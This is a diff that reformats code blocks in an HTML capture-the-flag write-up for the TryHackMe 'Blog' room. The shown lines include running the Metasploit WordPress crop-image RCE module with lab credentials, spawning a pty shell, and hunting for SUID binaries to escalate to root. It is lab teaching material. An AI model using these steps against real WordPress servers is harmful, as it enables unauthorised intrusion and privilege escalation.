@@ -113,7 +113,9 @@
         <div class="photo-container">
             <p><a href="https://tryhackme.com/r/room/blog">Link to room on TryHackMe.com</a></p>
             <p>Welcome to my TryHackMe-Blog-WriteUp! first we add machines ip adress on our /etc/hosts file as blog.thm: </p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo &quot;10.10.153.19 blog.thm&quot; &gt;&gt; /etc/hosts</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    echo &quot;10.10.153.19 blog.thm&quot; &gt;&gt; /etc/hosts
+            </code></pre></div>
             <p></p>
             <p>after that we start enumeration with rustscan and nmap:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
@@ -306,16 +308,28 @@
         <div class="photo-container">
             <img src="pics/b6.png" alt="Image 4">
             <p>When we login with this credentials we see there is no plugins. After some research i found a great exploit for wordpress 5. So we use the exploit  exploit/multi/http/wp_crop_rce . and then we set options like this and run:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set RHOSTS blog.thm</code></pre></div>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set USERNAME kwheel</code></pre></div>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set PASSWORD cutiepie1</code></pre></div>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>run</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    set RHOSTS blog.thm
+            </code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    set USERNAME kwheel
+            </code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    set PASSWORD cutiepie1
+            </code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    run
+            </code></pre></div>
         </div>
         <div class="photo-container">
             <img src="pics/b7.png" alt="Image 4">
             <p>And we see its worked we have a meterpreter shell. Then we use this commands to get a normal shell:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>shell</code></pre></div>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    shell
+            </code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+            </code></pre></div>
             <p></p>
             <p>After that we are in as user www-data. When we go to the home directory and we see there is a user named bjoel and in bjoel directory there is user.txt but it doesn&#39;t give us a flag:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
@@ -356,7 +370,9 @@
             </code></pre></div>
             <p></p>
             <p>Then we use this command to see which files runs with root privileges:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    find / -perm -u=s -type f 2&gt;/dev/null
+            </code></pre></div>
             <p>And we see there is a file called checker:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     www-data@blog:/home/bjoel$ find / -perm -u=s -type f 2&gt;/dev/null
@@ -400,7 +416,9 @@
             </code></pre></div>
             <p></p>
             <p>And done. We are root and we get our root flag. For to find where is user.txt we can use this command:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -name &quot;user.txt&quot; 2&gt;/dev/null</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    find / -name &quot;user.txt&quot; 2&gt;/dev/null
+            </code></pre></div>
             <p></p>
             <p>Then we see same file name exists in two different locations. In first one we couldn&#39;t find something. Then when we try second file we get our user flag:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
@@ -418,3 +436,4 @@
     </div>
 </body>
 </html>
+
